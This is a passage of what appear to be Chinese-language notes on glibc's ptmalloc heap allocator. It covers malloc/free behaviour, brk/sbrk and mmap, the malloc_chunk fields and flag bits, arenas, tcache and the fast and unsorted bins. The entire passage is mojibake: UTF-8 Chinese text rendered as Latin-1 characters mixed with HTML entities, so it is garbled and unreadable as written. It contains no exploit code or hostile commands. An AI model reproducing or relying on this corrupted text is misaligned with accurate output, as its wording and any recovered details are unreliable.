¹æ®éœ€æ±‚çš„ä¸åŒï¼Œbinåœ¨æ•°æ®ç»“æ„ä¸Šè¡¨ç°ä¸ºå•å‘é“¾è¡¨æˆ–è€…åŒå‘å¾ªç¯é“¾è¡¨ã€‚è€Œä¸”ç”¨æˆ·è¯·æ±‚å †å—çš„æ—¶å€™ä¼šä¼˜å…ˆæ¥è‡ªè¿™äº›é‡Šæ”¾çš„å †å— mallocå’Œfreemalloc ç©ºé—´ä¸å¤Ÿ &gt;è¿”å›null å‚æ•°ä¸º0 &gt;è¿”å›ä¸€ä¸ªæœ€å°çš„chunk å‚æ•°ä¸ºè´Ÿ&gt;ç”³è¯·æœ‰ä¸ªå¾ˆå¤§çš„ç©ºé—´ï¼ˆä¸€èˆ¬ä¸ä¼šæˆåŠŸï¼Œä¼šè¿”å›nullï¼‰ free å‚æ•°ä¸ºnull&gt; æ— å½±å“ å‚æ•°æŒ‡å‘çš„åœ°æ–¹å·²ç»è¢«é‡Šæ”¾æ—¶&gt; é™¤éè¢«ç¦ç”¨ï¼ˆä½¿ç”¨ malloptï¼‰ï¼Œå¦åˆ™å½“é‡Šæ”¾éå¸¸å¤§çš„å†…å­˜ç©ºé—´æ—¶ï¼Œå°†å°½å¯èƒ½è‡ªåŠ¨è§¦å‘å°†æœªä½¿ç”¨çš„å†…å­˜è¿”è¿˜ç»™ç³»ç»Ÿçš„æ“ä½œï¼Œä»è€Œå‡å°ç¨‹åºå ç”¨ã€‚ å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨ptmallocé€šè¿‡brk&#x2F;sbrkå’Œmmap&#x2F;munmapè¿™ä¸¤ç»„ç³»ç»Ÿè°ƒç”¨å®ç°äº¤äº’ brk&#x2F;sbrk å¯¹äºå †çš„æ“ä½œï¼ŒLinuxæ“ä½œç³»ç»Ÿæä¾›äº†brkå‡½æ•°ï¼Œglibcåº“æä¾›äº†sbrkå‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¢åŠ brkçš„å¤§å°æ¥å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ã€‚ åˆå§‹æ—¶ï¼Œå †çš„èµ·å§‹åœ°å€start_brkä»¥åŠå †çš„å½“å‰æœ«å°¾brkæŒ‡å‘åŒä¸€åœ°å€ã€‚ ä¸å¼€å¯ASLRä¿æŠ¤æ—¶ï¼Œstart_brkå’Œbrkä¼šæŒ‡å‘data&#x2F;bssæ®µçš„ç»“å°¾ã€‚ å¼€å¯ASLRä¿æŠ¤æ—¶ï¼Œstart_brkå’Œbrkä¹Ÿä¼šæŒ‡å‘åŒä¸€ä½ç½®ï¼Œå³åœ¨data&#x2F;bssæ®µç»“å°¾åçš„éšæœºåç§»å¤„ã€‚ ç°ä»£æ“ä½œç³»ç»Ÿæ¯æ¬¡é‡å¯æ—¶éƒ½ä¼šå¼€å¯ASLRï¼Œæ‰€ä»¥å †çš„èµ·å§‹åœ°å€ä¹Ÿæ˜¯éšæœºçš„ brk(): brk() å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå³æ–°çš„ brk æŒ‡é’ˆçš„ ç»å¯¹åœ°å€ã€‚ å¯ä»¥å°† brk æŒ‡é’ˆè®¾ç½®åˆ°ä»»ä½•ä½ æƒ³è¦çš„åˆæ³•ä½ç½®ï¼Œé€šå¸¸æ˜¯å‘ä¸Šç§»åŠ¨ä»¥ç”³è¯·æ›´å¤šå†…å­˜ã€‚ å®ƒçš„è¿”å›å€¼ä¸º 0 è¡¨ç¤ºæˆåŠŸï¼Œ-1 è¡¨ç¤ºå¤±è´¥ã€‚ è¿™ä¸ªå‡½æ•°æä¾›çš„æ˜¯ è®¾ç½® åŠŸèƒ½ã€‚ sbrk(): * sbrk() å‡½æ•°æ¥å—ä¸€ä¸ª å¢é‡ å‚æ•°ï¼ˆincrementï¼‰ã€‚ å®ƒå°†å½“å‰çš„ brk æŒ‡é’ˆ å‘å‰æˆ–å‘åç§»åŠ¨ æŒ‡å®šçš„å­—èŠ‚æ•°ã€‚ å®ƒè¿”å›ç§»åŠ¨å‰çš„ brk æŒ‡é’ˆçš„åœ°å€ã€‚å¦‚æœè¿”å› (void*)-1ï¼Œåˆ™è¡¨ç¤ºå¤±è´¥ã€‚ è¿™ä¸ªå‡½æ•°æä¾›çš„æ˜¯ å¢é‡ åŠŸèƒ½ã€‚ å½“ä½¿ç”¨ brk() æˆ– sbrk() ç”³è¯·å†…å­˜æ—¶ï¼Œå®é™…ä¸Šæ˜¯ç§»åŠ¨äº†æ•°æ®æ®µçš„æœ«å°¾ï¼ˆbrk æŒ‡é’ˆï¼‰ï¼Œä»è€Œè·å¾—æ›´å¤§çš„å †ç©ºé—´ã€‚ mmap&#x2F;munmap mallocä¼šä½¿ç”¨mmapæ¥æ˜ å°„æ•°æ®æ®µï¼Œå†…æ ¸ä¼šä¸ºä½ åˆ†é…ä¸€å—ç‰©ç†å†…å­˜ï¼Œå¹¶å°†å…¶å†…å®¹åˆå§‹åŒ–ä¸º 0ï¼Œä¸”mmap é»˜è®¤åˆ›å»ºçš„æ˜¯ç§æœ‰æ˜ å°„ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œè¢«æ˜ å°„çš„å†…å­˜åŒºåŸŸå±äºè°ƒç”¨å®ƒçš„è¿›ç¨‹ï¼Œå³ä½¿è¿™ä¸ªåŒºåŸŸæ˜¯æ–‡ä»¶æ˜ å°„ï¼Œè¯¥è¿›ç¨‹å¯¹å®ƒçš„ä¿®æ”¹ä¹Ÿä¸ä¼šåæ˜ åˆ°åŸæ–‡ä»¶ä¸­ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°å…¶ä»–åŒæ ·æ˜ å°„äº†æ­¤æ–‡ä»¶çš„è¿›ç¨‹ã€‚ munmapä¸mmapå¯¹åº”ï¼Œå…¶ä½œç”¨æ˜¯é‡Šæ”¾ç”³è¯·çš„å†…å­˜ å †ç›¸å…³çš„æ•°æ®ç»“æ„malloc_chunk_6malloc åˆ†é…çš„å†…å­˜è¢«ç§°ä¸º chunkï¼Œå®ƒä»¬åœ¨è¢«é‡Šæ”¾åä¸ä¼šç«‹å³å½’è¿˜ç»™ç³»ç»Ÿï¼Œè€Œæ˜¯è¿›å…¥ä»¥åŒå‘é“¾è¡¨å½¢å¼ç»„ç»‡çš„ bin*ä¸­ã€‚ åœ¨malloc_chunkçš„å®šä¹‰ä¸­ï¼Œå…±æœ‰6ä¸ªå­—æ®µï¼Œå³prev_sizeã€sizeã€fdã€bkã€fd_nextsizeã€bk_nextsizeã€‚ prev_sizeå’Œsizeæ˜¯ä¸¤ä¸ªsize_tå­—æ®µï¼Œè€Œfd&#x2F;bkã€fd_nextsize&#x2F;bk_nextsizeéƒ½æ˜¯æŒ‡é’ˆå­—æ®µï¼Œå®é™…ä¸Šè®°å½•äº†ä¸¤ä¸ªåŒå‘é“¾è¡¨ã€‚ prev_sizeå­˜å‚¨å‰ä¸€ä¸ª chunk çš„å¤§å° åœ¨ malloc_chunkç»“æ„ä½“ä¸­ï¼Œprev_size å­—æ®µä½äº size&#96;å­—æ®µä¹‹å‰ å½“å‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkæ˜¯ç©ºé—²çš„ï¼ˆfreeï¼‰ï¼š ptmalloc åº“å¯ä»¥é€šè¿‡è¿™ä¸ªå€¼ï¼Œå¿«é€Ÿæ‰¾åˆ°å‰ä¸€ä¸ªç©ºé—² chunk çš„èµ·å§‹ä½ç½®ï¼Œä»è€Œå°†ä¸¤ä¸ªç©ºé—² chunk åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„ç©ºé—² chunkï¼Œé¿å…å†…å­˜ç¢ç‰‡ å½“å‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkæ­£åœ¨ä½¿ç”¨ï¼ˆin useï¼‰ï¼š å‰ä¸€ä¸ª chunk çš„å°¾éƒ¨æ˜¯ç”¨æˆ·æ•°æ® é‚£ä¹ˆï¼Œä½ å½“å‰ chunk çš„prev_size å­—æ®µï¼Œå…¶å®ä½äºå‰ä¸€ä¸ª chunk çš„ç”¨æˆ·æ•°æ®åŒºå†…éƒ¨ã€‚ æ­¤æ—¶ï¼Œptmalloc çŸ¥é“å‰ä¸€ä¸ª chunk æ˜¯è¢«å ç”¨çš„ï¼Œæ‰€ä»¥å®ƒä¸ä¼šå»è¯»å– prev_size è¿™ä¸ªå­—æ®µã€‚å› æ­¤ï¼Œè¿™ä¸ªå­—æ®µçš„ç©ºé—´å¯ä»¥è¢«å‰ä¸€ä¸ª chunk çš„ç”¨æˆ·æ•°æ®æ‰€å ç”¨ï¼ˆç©ºé—´å¤ç”¨ï¼‰ sizeå­˜å‚¨ç€å½“å‰chunkçš„å¤§å°ï¼Œæ˜¯2ï¼ŠSIZE_SZçš„æ•´æ•°å€ åœ¨32ä½çš„ç³»ç»Ÿä¸­sizeæ˜¯8çš„æ•´æ•°å€ï¼Œ64ä½ç³»ç»Ÿä¸­æ˜¯16çš„æ•´æ•°å€ ç”¨æˆ·ç¨‹åºç”³è¯·çš„å¤§å°éƒ½ä¼šå‘ä¸Šå–æ•´ï¼Œæ¯”å¦‚åœ¨32ä½ç¨‹åºä¸­ï¼Œç”¨æˆ·ç”³è¯·çš„å¤§å°ä¸º0x14ï¼Œé‚£ä¹ˆå‘ä¸Šå–æ•´åä¸º0x18ã€‚ä½†å®é™…ä¸Šï¼Œåœ¨åˆ†é…çš„æ—¶å€™ï¼Œå› ä¸ºç©ºé—´å¤ç”¨ï¼Œæ‰€ä»¥åˆ†é…0x14å­—èŠ‚çš„chunkçš„æ—¶å€™ï¼Œç»“æœä¼šå’Œé¢„æƒ³çš„ä¸ä¸€æ · æŠŠsizeä»¥äºŒè¿›åˆ¶å†™å‡ºæ¥ä¼šå‘ç°åä¸‰ä½éƒ½æ˜¯0ï¼Œæ‰€ä»¥å°†æœ€ä½çš„ä¸‰ä½ç”¨äºå­˜å‚¨ä¸‰ä¸ªæ ‡å¿—ä½ï¼Œåˆ†åˆ«æ˜¯A|M|Pï¼Œä»é«˜ä½åˆ°ä½ä½ï¼Œ å…¶å¯¹åº”çš„è§£é‡Šå¦‚ä¸‹ï¼š A (NON_MAIN_ARENA): ptmalloc æ”¯æŒå¤šçº¿ç¨‹,æ¯ä¸ªçº¿ç¨‹å¯ä»¥æœ‰è‡ªå·±çš„å†…å­˜æ± ,è¿™è¢«ç§°ä¸º arena,æ ‡å¿—ä½è¡¨ç¤ºæ˜¯ä¸æ˜¯ä¸»arenaã€‚ å¦‚æœ A æ˜¯ 1 &gt; è¿™ä¸ª chunk æ¥è‡ªä¸€ä¸ªéä¸» arena å¦‚æœ A æ˜¯ 0 &gt; è¿™ä¸ª chunk æ¥è‡ªä¸» arena M (IS_MMAPED): è¡¨ç¤ºå½“å‰ chunk æ˜¯é€šè¿‡ mmap åˆ†é…çš„ï¼Œè¿˜æ˜¯é€šè¿‡ brk ä»ä¸»å †ä¸­åˆ†é…çš„ M æ˜¯ 1 &gt; è¿™ä¸ª chunké€šè¿‡ mmap ç³»ç»Ÿè°ƒç”¨è·å¾—çš„,å½“å®ƒè¢«é‡Šæ”¾æ—¶ï¼Œptmalloc ä¸ä¼šæŠŠå®ƒæ”¾å…¥ç©ºé—²é“¾è¡¨ï¼ˆbinï¼‰ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨ munmap å°†å…¶å½’è¿˜ç»™æ“ä½œç³»ç»Ÿ M æ˜¯ 0 &gt; è¿™ä¸ª chunkæ˜¯é€šè¿‡ brk() ä»ä¸»å †åˆ†é…çš„ ,å½“å®ƒè¢«é‡Šæ”¾æ—¶ï¼Œptmalloc ä¼šå°†å…¶æ”¾å…¥å¯¹åº”çš„ bin ä¸­ P (PREV_INUSE): è¡¨ç¤ºå‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„ chunk æ˜¯å¦æ­£åœ¨ä½¿ç”¨ä¸­ P æ˜¯ 1 &gt; è¯´æ˜å‰ä¸€ä¸ª chunk æ­£åœ¨è¢«å ç”¨ï¼Œptmalloc åœ¨é‡Šæ”¾å½“å‰ chunk æ—¶ï¼Œå°±ä¸éœ€è¦æ£€æŸ¥å’Œåˆå¹¶å‰ä¸€ä¸ª chunkã€‚ P æ˜¯ 0 &gt; è¯´æ˜å‰ä¸€ä¸ª chunk æ˜¯ç©ºé—²çš„ã€‚ptmalloc åœ¨é‡Šæ”¾å½“å‰ chunk æ—¶ï¼Œä¼šå»æŸ¥çœ‹å‰ä¸€ä¸ª chunkï¼Œå¹¶å°è¯•å°†ä¸¤ä¸ªç©ºé—²çš„ chunk åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„å—ï¼Œä»è€Œé¿å…å†…å­˜ç¢ç‰‡ eg: 0x71ï¼Œ0x71&#x3D;&#x3D;0x70|0b001ï¼Œè¡¨ç¤ºè¿™ä¸ªchunkçš„å¤§å°ä¸º0x70ï¼Œå¯¹åº”çš„ä¸‰ä¸ªæ ‡å¿—ä½ä¸ºï¼šA&#x3D;0ï¼ŒM&#x3D;0ï¼ŒP&#x3D;1ï¼Œå³è¿™ä¸ªchunkå±äºä¸»çº¿ç¨‹ï¼Œä¸æ˜¯ç”±mmapç³»ç»Ÿè°ƒç”¨åˆ†é…ï¼Œå‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkåœ¨ä½¿ç”¨ä¸­ã€‚ â‘0x105ï¼Œ0x105&#x3D;&#x3D;0x100|0b101ï¼Œè¡¨ç¤ºè¿™ä¸ªchunkçš„å¤§å°ä¸º0x100ï¼Œå¯¹åº”çš„ä¸‰ä¸ªæ ‡å¿—ä½ä¸ºï¼šA&#x3D;1ï¼ŒM&#x3D;0ï¼ŒP&#x3D;1ï¼Œå³è¿™ä¸ªchunkä¸å±äºä¸»çº¿ç¨‹ï¼Œç”±å…¶ä»–çº¿ç¨‹åˆ†é…ï¼Œä¸æ˜¯ç”±mmapç³»ç»Ÿè°ƒç”¨åˆ†é…ï¼Œå‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkåœ¨ä½¿ç”¨ä¸­ã€‚ æƒ³è±¡ä¸€ä¸‹ arena æ˜¯ä¸€ä¸ªå†…å­˜åˆ†é…çš„å·¥å‚ã€‚æ¯ä¸ªå·¥å‚éƒ½æœ‰è‡ªå·±çš„åŸææ–™ï¼ˆå †ç©ºé—´ï¼‰å’Œä¸€å¥—ç®¡ç†æµç¨‹ã€‚ ä¸» arenaï¼šæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸”åªæœ‰ä¸€ä¸ªä¸» arenaã€‚å®ƒä½¿ç”¨è¿›ç¨‹çš„ä¸»å †ï¼ˆmain heapï¼Œé€šè¿‡ brk() æ‰©å±•çš„æ•°æ®æ®µï¼‰ä½œä¸ºåŸææ–™ã€‚æ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥ä»ä¸» arena ç”³è¯·å†…å­˜ã€‚ éä¸» arenaï¼šåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶è¯·æ±‚å†…å­˜ï¼Œä¸ºäº†é¿å…é”ç«äº‰ï¼Œptmalloc ä¼šä¸ºæŸäº›çº¿ç¨‹åˆ›å»ºæ–°çš„ arenaã€‚è¿™äº›æ–°çš„ arena ä¸ä½¿ç”¨ä¸»å †ï¼Œè€Œæ˜¯é€šè¿‡ mmap() ä»æ“ä½œç³»ç»Ÿè·å–ç‹¬ç«‹çš„å †ç©ºé—´æ¥ä½œä¸ºè‡ªå·±çš„åŸææ–™ã€‚ è®©æˆ‘ä»¬ç”¨ä¸€ä¸ªç®€åŒ–çš„æµç¨‹æ¥æè¿° chunk å’Œ arena çš„å…³ç³»: çº¿ç¨‹ A è°ƒç”¨ malloc() è¯·æ±‚ 100 å­—èŠ‚å†…å­˜ã€‚ ptmalloc æ£€æŸ¥çº¿ç¨‹ A æ˜¯å¦æœ‰è‡ªå·±çš„ arenaã€‚å¦‚æœè¿™æ˜¯ç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼Œå®ƒä¼šä½¿ç”¨ä¸» arenaã€‚ ä¸» arena æ£€æŸ¥è‡ªå·±çš„ç©ºé—²é“¾è¡¨ï¼ˆbinï¼‰ã€‚å¦‚æœæ²¡æœ‰åˆé€‚çš„chunkï¼Œå®ƒä¼šé€šè¿‡ brk() æ‰©å±•è‡ªå·±çš„ä¸»å †ï¼Œç„¶åä»æ–°ç©ºé—´ä¸­åˆ‡å‡º 100 å­—èŠ‚çš„chunkï¼Œå¹¶è¿”å›ç»™çº¿ç¨‹ Aã€‚ çº¿ç¨‹ B åŒæ—¶è°ƒç”¨ malloc() è¯·æ±‚ 200 å­—èŠ‚å†…å­˜ã€‚ å¦‚æœæ­¤æ—¶ä¸» arena è¢«çº¿ç¨‹ A é”ä½ï¼Œptmalloc ä¼šä¸ºçº¿ç¨‹ B åˆ›å»ºä¸€ä¸ªæ–°çš„ arenaã€‚ è¿™ä¸ªæ–° arena é€šè¿‡ mmap() è·å¾—è‡ªå·±çš„å †ç©ºé—´ã€‚ç„¶åä»è¿™å—æ–°ç©ºé—´ä¸­åˆ†é…ä¸€ä¸ª 200 å­—èŠ‚çš„chunkï¼Œå¹¶è¿”å›ç»™çº¿ç¨‹ Bã€‚ æ€»è€Œè¨€ä¹‹ï¼Œarena å°±åƒä¸€ä¸ªç‹¬ç«‹çš„å†…å­˜ç®¡ç†å•å…ƒï¼Œå®ƒæ‹¥æœ‰å’Œç®¡ç†è‡ªå·±çš„å †ç©ºé—´ï¼Œå¹¶è´Ÿè´£åˆ†é…å’Œå›æ”¶ chunkã€‚chunk åˆ™æ˜¯ arena ç®¡ç†ä¸‹çš„æœ€å°å†…å­˜å•å…ƒã€‚ fd&#x2F;bkï¼ˆforward&#x2F;backwardï¼‰å½“chunkå¤„äºåˆ†é…çŠ¶æ€ï¼ˆä½¿ç”¨çŠ¶æ€ï¼‰çš„æ—¶å€™ï¼Œä»fdè¿™ä¸ªå­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ï¼Œæ‰€ä»¥å¦‚æœç”¨æˆ·ç¨‹åºåˆ†é…çš„å †å—å¤§å°æ˜¯0x20ï¼Œé‚£ä¹ˆå®é™…çš„å¼€é”€æ˜¯0x20+0x10ï¼ˆ64ä½ç¨‹åºï¼‰ï¼Œå¤šä½™çš„0x10æ˜¯glibcä¸ºäº†ç»´æŠ¤æ‰€æœ‰çš„chunkè€Œäº§ç”Ÿçš„å¼€é”€ã€‚æ­¤æ—¶fd&#x2F;bkä¸ä½¿ç”¨ï¼Œç©ºé—´è¢«ç”¨æˆ·æ•°æ®å¤ç”¨ å¦‚æœä¸€ä¸ªchunkå¤„äºæœªä½¿ç”¨çŠ¶æ€ï¼Œé‚£ä¹ˆfd&#x2F;bkå°±ä¼šè®°å½•ç›¸åº”çš„é“¾è¡¨ä¿¡æ¯ã€‚å½“ä¸€ä¸ª chunk è¢«é‡Šæ”¾åï¼Œptmalloc ä¼šå°†å®ƒæ”¾å…¥ç›¸åº”çš„ç©ºé—²é“¾è¡¨bin fd æŒ‡é’ˆä¼šæŒ‡å‘é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªç©ºé—² chunkï¼Œå…ˆè¿›å…¥é“¾è¡¨ bk æŒ‡é’ˆä¼šæŒ‡å‘é“¾è¡¨ä¸­çš„ä¸Šä¸€ä¸ªç©ºé—² chunkï¼Œåè¿›å…¥é“¾è¡¨ fd_nextsize&#x2F;bk_nextsizelarge_binä¸­å­˜å‚¨ç€ä¸åŒå¤§å°çš„chunk fd_nextsize (forward next size)ï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªå°ºå¯¸æ›´å¤§çš„ç©ºé—² chunk bk_nextsize (backward next size)ï¼šæŒ‡å‘ä¸Šä¸€ä¸ªå°ºå¯¸æ›´å°çš„ç©ºé—² chunk tcatchå’Œbintcache å’Œ bin éƒ½æ˜¯ Glibcï¼ˆGNU C Libraryï¼‰ä¸­ malloc å®ç°ï¼ˆç§°ä¸º ptmalloc2ï¼‰ç”¨äºç®¡ç†ç©ºé—²å†…å­˜å—çš„æ•°æ®ç»“æ„ã€‚å½“ä½ è°ƒç”¨ free() é‡Šæ”¾ä¸€å—å†…å­˜æ—¶ï¼Œç³»ç»Ÿä¸ä¼šç«‹å³å°†å®ƒå½’è¿˜ç»™æ“ä½œç³»ç»Ÿï¼Œè€Œæ˜¯ç”±è¿™äº›ç»“æ„æš‚æ—¶ä¿ç®¡ï¼Œä»¥ä¾¿åç»­çš„ malloc() è¯·æ±‚èƒ½å¤Ÿå¿«é€Ÿåˆ†é…å‡ºå» Tcache binglibc-2.26ä¹‹åå¼•å…¥çš„ï¼Œæ˜¯ä¼˜å…ˆäºfast_binçš„chunkç¼“å†²åŒº æ˜¯ä»€ä¹ˆï¼Ÿ å®ƒæŠŠå°å°ºå¯¸æŒ‰å¤§å°ç±»åˆ†æˆè‹¥å¹²ä¸ª binï¼Œæ¯ä¸ª bin ä¿å­˜æœ€è¿‘ freed çš„è‹¥å¹²ä¸ªåŒ size chunkï¼Œmalloc ä¼šå…ˆä» tcache æ‹¿ï¼Œfree ä¼šå…ˆæ”¾åˆ° tcacheã€‚ free(ptr)ï¼š è®¡ç®— chunk size â†’ æ‰¾å¯¹åº” tcache binã€‚ è‹¥è¯¥ bin çš„æ¡ç›®æ•° &lt; æœ€å¤§å€¼ï¼ˆ7ï¼‰(éšlibcç‰ˆæœ¬æœ‰å·®å¼‚)ï¼Œå°† chunk æ”¾å…¥ tcacheï¼ˆåœ¨ payload å¼€å¤´å†™ä¸Š next æŒ‡é’ˆï¼Œé“¾åˆ°å½“å‰ headï¼‰ï¼›ä¸ä¼šç«‹å³å†™å…¥ fastbin&#x2F;unsortedã€‚ è‹¥ bin å·²æ»¡ï¼ˆâ‰¥7ï¼‰ï¼Œåˆ™è¿™ä¸ª chunk æŒ‰ä¼ ç»Ÿè·¯å¾„ç»§ç»­ï¼ˆå¦‚æ”¾åˆ° fastbin &#x2F; unsorted binï¼‰ã€‚ malloc(size)ï¼š å…ˆçœ‹ tcache å¯¹åº” bin æ˜¯å¦éç©ºï¼šè‹¥éç©ºï¼Œä» tcache pop å‡ºç¬¬ä¸€ä¸ª chunkï¼ˆLIFOï¼‰ï¼Œè¿”å›ç»™è°ƒç”¨è€…ã€‚ è‹¥ tcache ç©ºï¼Œç»§ç»­åˆ° fastbin&#x2F;smallbin&#x2F;largebin&#x2F;unsorted&#x2F;bin æˆ–è°ƒç”¨å†…æ ¸æ‰©å±•ï¼ˆbrk&#x2F;mmapï¼‰ç­‰ã€‚ é‡è¦ï¼štcache æ˜¯LIFOï¼ˆåè¿›å…ˆå‡ºï¼‰å•é“¾è¡¨ï¼Œä¸”å­˜æ”¾åœ¨ user areaï¼ˆpayloadï¼‰ï¼Œæ‰€ä»¥å†™å…¥&#x2F;è¯»å–éƒ½æ˜¯ç›´æ¥å¯¹ payload åœ°å€æ“ä½œ ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ åœ¨å¤šçº¿ç¨‹ç¨‹åºä¸­ï¼Œå¦‚æœæ‰€æœ‰çº¿ç¨‹éƒ½å»ä¸€ä¸ªâ€œå…¬å…±ä»“åº“â€ï¼ˆå…¨å±€çš„ binï¼‰é‡Œå–æ”¾å†…å­˜ï¼Œå°±å¿…é¡»ç”¨é”æ¥é˜²æ­¢æ•°æ®æ··ä¹±ã€‚é¢‘ç¹çš„åŠ é”è§£é”æ“ä½œä¼šæˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚ tcache ä¸ºæ¯ä¸ªçº¿ç¨‹æä¾›äº†ä¸€ä¸ªâ€œç§äººæŠ½å±‰â€ï¼Œå¤§éƒ¨åˆ†æ“ä½œéƒ½åœ¨è¿™ä¸ªç§äººç©ºé—´é‡Œå®Œæˆï¼Œé¿å…äº†å»â€œå…¬å…±ä»“åº“â€ç«äº‰ï¼Œæ‰€ä»¥é€Ÿåº¦æå¿«ã€‚ å·¥ä½œåŸç†ï¼š æ¯ä¸ªçº¿ç¨‹çš„ tcache åŒ…å« 64 æ¡å•é“¾è¡¨ã€‚ æ¯æ¡é“¾è¡¨ä¸“é—¨ç”¨äºå­˜æ”¾ä¸€ç§ç‰¹å®šå¤§å°çš„å†…å­˜å—ï¼ˆä¾‹å¦‚ï¼Œ64ä½ä¸­ç¬¬ä¸€æ¡é“¾è¡¨æ”¾ 24 å­—èŠ‚çš„å—ï¼Œç¬¬äºŒæ¡æ”¾ 32 å­—èŠ‚çš„å—â€¦ä»¥æ­¤ç±»æ¨ï¼Œ32ä½ä¸­æœ€å°æ˜¯12é€’å¢ä¸º8ï¼‰ æ¯æ¡é“¾è¡¨æœ€å¤šç¼“å­˜ 7 ä¸ªç©ºé—²å—ã€‚ ç‰¹ç‚¹æ€»ç»“ï¼š çº¿ç¨‹ç§æœ‰ï¼šæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ï¼Œä¸å…±äº«ã€‚ æ— é”æ“ä½œï¼šé€Ÿåº¦å¿«ï¼Œæ€§èƒ½é«˜ã€‚ å®¹é‡å°ï¼šåªæœ‰64ä¸ªå¤§å°ç±»ï¼Œæ¯æ¡é“¾è¡¨æœ€å¤š7ä¸ªå—ã€‚ ä¼˜å…ˆçº§æœ€é«˜ï¼šmalloc&#x2F;free ä¼šä¼˜å…ˆæ“ä½œ tcacheã€‚ glibcæ˜¯åœ¨2.26çš„ç‰ˆæœ¬ä¹‹åå‡ºç°çš„ï¼Œ2.29å¯¹å®ƒè¿›è¡Œäº†åŠ å›º Bin ï¼ˆåƒåœ¾æ¡¶ &#x2F; å›æ”¶ç«™ï¼‰ æ˜¯ä»€ä¹ˆï¼Ÿ bin æ˜¯ å…¨å±€å…±äº«çš„ ç©ºé—²å†…å­˜å—é“¾è¡¨ã€‚å®ƒæ˜¯å †å†…å­˜ç®¡ç†çš„åŸºç¡€ç»“æ„ï¼Œæ‰€æœ‰å¤§å°çš„å†…å­˜å—æœ€ç»ˆå¦‚æœæ²¡è¢« tcache æ¥æ”¶ï¼Œéƒ½ä¼šç”±å¯¹åº”çš„ bin æ¥ç®¡ç†ã€‚ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆå…¬å…±ä»“åº“ã€‚ ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ å®ƒæ˜¯å †ç®¡ç†å™¨çš„æ ¸å¿ƒåŸºç¡€è®¾æ–½ï¼Œç”¨äºæœåŠ¡æ‰€æœ‰å¤§å°çš„å†…å­˜åˆ†é…è¯·æ±‚ï¼Œå°¤å…¶æ˜¯é‚£äº› tcache å¤„ç†ä¸äº†çš„å¤§å—å†…å­˜ï¼Œæˆ–è€…å½“ tcache å·²æ»¡æ—¶ã€‚ å·¥ä½œåŸç†ä¸åˆ†ç±»ï¼šbin ä¸æ˜¯ä¸€ä¸ªå•ä¸€ç»“æ„ï¼Œè€Œæ˜¯ä¸€ä¸ªç³»åˆ—ï¼Œæ ¹æ®ç®¡ç†ç­–ç•¥ä¸åŒåˆ†ä¸ºå››ç§ï¼š Fast_binï¼šï¼ˆåè¿›å…ˆå‡ºï¼‰ ç‰¹ç‚¹ï¼šå•é“¾è¡¨ï¼Œæ“ä½œæœ€å¿«ã€‚ä¸“é—¨ç”¨äºå­˜æ”¾éå¸¸å°çš„å†…å­˜å—ã€‚ è¡Œä¸ºï¼šåŒæ ·å¤§å°çš„å—æ‰ä¼šæ”¾åœ¨åŒä¸€ä¸ªé“¾è¡¨ä¸­ã€‚free æ—¶ä¼šæœ‰ç®€å•çš„æ£€æŸ¥æ¥é˜²æ­¢è¿ç»­çš„ double freeã€‚ ä¸æ”¹å˜ä½¿ç”¨æ ‡å¿—p,ä¹Ÿå°±æ˜¯è¯´å®ƒæ— æ³•åˆå¹¶ï¼ˆä¸€èˆ¬ä¸åˆå¹¶ï¼‰ max_fast æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒå®šä¹‰äº†æœ€å¤§èƒ½å¤Ÿè¢«å½“ä½œâ€œå¿«é€Ÿå—â€å¤„ç†çš„å†…å­˜å¤§å°ã€‚å®ƒçš„å€¼å†³å®šäº†å“ªäº›å†…å­˜å—åœ¨é‡Šæ”¾æ—¶ä¼šè¿›å…¥åˆ†é…é€Ÿåº¦æœ€å¿«çš„ fastbin ç»“æ„ Unsorted_binï¼š ç‰¹ç‚¹ï¼šåŒå‘é“¾è¡¨ã€‚è¿™æ˜¯ä¸€ä¸ªâ€œä¸­è½¬ç«™â€æˆ–â€œå¤§æ‚çƒ©â€ã€‚unsorted binä¸­çš„chunkå¤„äºä¹±åºçš„çŠ¶æ€ï¼Œå’Œæ—¶é—´ã€å¤§å°æ²¡æœ‰å›ºå®šçš„å…³ç³»ã€‚æ‰€æœ‰ä¸åœ¨fast binèŒƒå›´å†…çš„å †å—é‡Šæ”¾åï¼Œéƒ½ä¼šå…ˆæ”¾å…¥unsorted binä¸­ã€‚ æ¥æºï¼šä¸€ä¸ªè¾ƒå¤§çš„chunkè¢«åˆ†å‰²æˆä¸¤éƒ¨åˆ†åï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äºMINSIZEï¼ˆ64ä½ç³»ç»Ÿä¸­ä¸º0x20ï¼‰ï¼Œå°±ä¼šè¢«æ”¾åˆ°unsorted binä¸­ï¼›é‡Šæ”¾ä¸€ä¸ªä¸å±äºfast 